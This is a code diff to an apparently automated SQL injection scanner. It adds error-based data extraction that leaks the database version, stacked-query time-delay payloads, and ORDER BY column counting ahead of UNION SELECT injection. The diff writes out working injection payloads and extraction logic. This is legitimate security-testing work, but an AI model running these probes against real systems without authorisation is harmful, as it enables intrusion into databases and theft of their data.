@@ -456,8 +456,13 @@ class Scanner:
                 # Explicit SQL error text — confirmed, no ambiguity.
                 pre_score, pre_ev = self.detector.quick_score(baseline, quote_probe)
                 evidence = pre_ev or f"SQL error: {quote_errors[0][:80]}"
-                return self._build_finding(
+                finding = self._build_finding(
                     point, quote_probe, baseline, evidence, max(pre_score, 0.85)
+                )
+                # Prove impact: extract data via the error channel.
+                return self._enrich_error(
+                    finding, url, method, data, content_type, extra_headers,
+                    point, report,
                 )
 
             if status_changed:
@@ -657,6 +662,10 @@ class Scanner:
             if score >= 0.85:
                 finding = self._build_finding(point, injected, baseline, best_evidence, score)
                 if finding is not None:
+                    finding = self._enrich_error(
+                        finding, url, method, data, content_type, extra_headers,
+                        point, report,
+                    )
                     if not self.continue_on_found:
                         return finding
                     # continue_on_found: record but keep probing for other inj types
@@ -942,6 +951,56 @@ class Scanner:
             char_ratio = mism / checked if checked else 0.0
         return max(len_ratio, char_ratio)
 
+    def _enrich_error(
+        self, finding, url, method, data, content_type, extra_headers, point, report,
+    ):
+        """Prove exploitability of a confirmed error-based finding by extracting
+        data via the DB's error channel (MySQL extractvalue/updatexml, PG/MSSQL
+        CAST). On success, embed the leaked value (e.g. the DB version) in the
+        evidence, fingerprint the engine, and bump confidence. Best-effort:
+        returns the finding unchanged if nothing leaks."""
+        if finding is None or finding.injection_type != InjectionType.ERROR_BASED:
+            return finding
+        if self.fast:
+            return finding
+        import re
+
+        from llmsql.payloads import ERROR_EXTRACT_TEMPLATES
+        orig = point.original_value or ""
+        for tpl, db in ERROR_EXTRACT_TEMPLATES:
+            pl = orig + tpl.format(q="version()")
+            ex = self.probe.send(
+                url, method, data, content_type, extra_headers,
+                inject_point=point, payload=pl,
+            )
+            report.add_request()
+            body = ex.response_body or ""
+            leaked = None
+            mm = re.search(r"~([^~]{2,80})~", body)  # extractvalue/updatexml
+            if mm and mm.group(1).strip():
+                leaked = mm.group(1).strip()
+            else:  # PG/MSSQL cast error leaking a version-like string
+                mm2 = re.search(
+                    r"(PostgreSQL [\d.]+[^\"'<\n]{0,40}"
+                    r"|\d+\.\d+\.\d+[-\w+.]*(?: [^\"'<\n]{0,30})?"
+                    r"|Microsoft SQL Server[^\"'<\n]{0,40})",
+                    body,
+                )
+                if mm2 and mm2.group(1).strip() not in ("", orig):
+                    leaked = mm2.group(1).strip()
+            if leaked:
+                finding.db_type = finding.db_type or db
+                finding.evidence = (
+                    finding.evidence + f"; EXTRACTED (error-based): {leaked[:80]}"
+                ).strip("; ")
+                finding.reasoning = (
+                    (finding.reasoning or "")
+                    + f" Data extraction confirmed — leaked: {leaked[:80]}"
+                ).strip()
+                finding.confidence = max(finding.confidence, 0.95)
+                break
+        return finding
+
     def _test_time_based(
         self, url, method, data, content_type, extra_headers, point, baseline, report,
     ) -> Optional[Finding]:
@@ -957,20 +1016,24 @@ class Scanner:
         """
         if self.fast:
             return None
-        from llmsql.payloads import TIME_BASED_POLYGLOTS, TIME_BASED_TEMPLATES
+        from llmsql.payloads import (
+            STACKED_TIME_TEMPLATES, TIME_BASED_POLYGLOTS, TIME_BASED_TEMPLATES,
+        )
         sleep_s = max(1, int(round(self._sleep_ms / 1000)))
         thresh = self._sleep_ms * 0.7
         orig = point.original_value or ""
 
         # Try context-breaking POLYGLOTS first (one request covers numeric +
-        # single-quote + double-quote), then per-context payloads as fallback.
-        # `replace=True` sends the payload AS the whole value (polyglots break
-        # out of context themselves); `replace=False` appends to the original.
+        # single-quote + double-quote), then per-context inline payloads, then
+        # STACKED-query payloads (a delay there = multi-statement support, a
+        # stronger STACKED finding). Tuple: (template, replace, injection_type).
+        # `replace=True` sends the payload AS the whole value; else appended.
         attempts = (
-            [(tpl, True) for tpl in TIME_BASED_POLYGLOTS]
-            + [(tpl, False) for tpl in TIME_BASED_TEMPLATES]
+            [(t, True, InjectionType.TIME_BLIND) for t in TIME_BASED_POLYGLOTS]
+            + [(t, False, InjectionType.TIME_BLIND) for t in TIME_BASED_TEMPLATES]
+            + [(t, False, InjectionType.STACKED) for t in STACKED_TIME_TEMPLATES]
         )
-        for tpl, replace in attempts:
+        for tpl, replace, itype in attempts:
             payload = tpl.format(s=sleep_s)
             ctrl = tpl.format(s=0)
             send_payload = payload if replace else orig + payload
@@ -993,12 +1056,17 @@ class Scanner:
             report.add_request()
             ctrl_delay = ctrl_ex.response_time_ms - baseline.response_time_ms
             if ctrl_delay < thresh * 0.6:
-                kind = "polyglot" if replace else "per-context"
+                if itype == InjectionType.STACKED:
+                    kind = "stacked-query"
+                elif replace:
+                    kind = "polyglot"
+                else:
+                    kind = "per-context"
                 return self._build_finding(
                     point, ex, baseline,
                     f"Time-based blind ({kind}): {payload!r} delayed +{delay:.0f}ms "
                     f"(~{sleep_s}s); control (0s) returned fast (+{ctrl_delay:.0f}ms)",
-                    0.9, inj_type=InjectionType.TIME_BLIND,
+                    0.9, inj_type=itype,
                 )
         return None
 
@@ -1020,12 +1088,18 @@ class Scanner:
         if marker in (baseline.response_body or ""):
             return None
         orig = point.original_value or ""
-        # Common query contexts: string-quoted, numeric. (Bounded to keep the
-        # per-param request cost low — 2 boundaries x 5 cols = 10 requests max.)
-        boundaries = ["'", ""]
-        max_cols = 5
-        for prefix in boundaries:
-            for n in range(1, max_cols + 1):
+        max_cols = 8
+        for prefix in ("'", ""):
+            # 1) Find the column count with ORDER BY N: it succeeds up to the
+            #    real count, then errors/changes when N exceeds it. This lets us
+            #    build ONE correctly-sized UNION instead of brute-forcing widths.
+            ncols = self._union_column_count(
+                url, method, data, content_type, extra_headers, point,
+                baseline, report, prefix, max_cols,
+            )
+            # Candidate widths: the discovered count first, else brute 1..max.
+            widths = [ncols] if ncols else list(range(1, max_cols + 1))
+            for n in widths:
                 cols = ",".join(["'%s'" % marker] * n)
                 payload = "%s%s UNION SELECT %s-- -" % (orig, prefix, cols)
                 ex = self.probe.send(
@@ -1034,13 +1108,43 @@ class Scanner:
                 )
                 report.add_request()
                 if marker in (ex.response_body or ""):
+                    via = f" via ORDER BY→{n} cols" if ncols else ""
                     ev = ("UNION-based SQLi: injected marker reflected "
-                          "(%d column(s), boundary %r)" % (n, prefix or "numeric"))
+                          "(%d column(s), boundary %r%s)" % (n, prefix or "numeric", via))
                     return self._build_finding(
                         point, ex, baseline, ev, 0.95,
                         inj_type=InjectionType.UNION_BASED,
                     )
         return None
+
+    def _union_column_count(
+        self, url, method, data, content_type, extra_headers, point, baseline,
+        report, prefix, max_cols,
+    ) -> Optional[int]:
+        """Discover a query's column count via ``ORDER BY N``.
+
+        ORDER BY N is valid while N <= column count and errors (or changes the
+        response) once N exceeds it. The last N that behaved like the baseline
+        is the column count. Returns None if inconclusive (falls back to brute).
+        """
+        last_ok = 0
+        base_status = baseline.status_code
+        for n in range(1, max_cols + 1):
+            payload = "%s%s ORDER BY %d-- -" % (orig := (point.original_value or ""), prefix, n)
+            ex = self.probe.send(
+                url, method, data, content_type, extra_headers,
+                inject_point=point, payload=payload,
+            )
+            report.add_request()
+            errored = (
+                ex.status_code != base_status
+                or bool(self.detector.find_sql_errors(ex.response_body))
+            )
+            if errored:
+                # N is one past the column count.
+                return last_ok if last_ok >= 1 else None
+            last_ok = n
+        return None  # never errored within range — inconclusive
 
     def _test_nosql(
         self, url, method, data, content_type, extra_headers, point, baseline, report
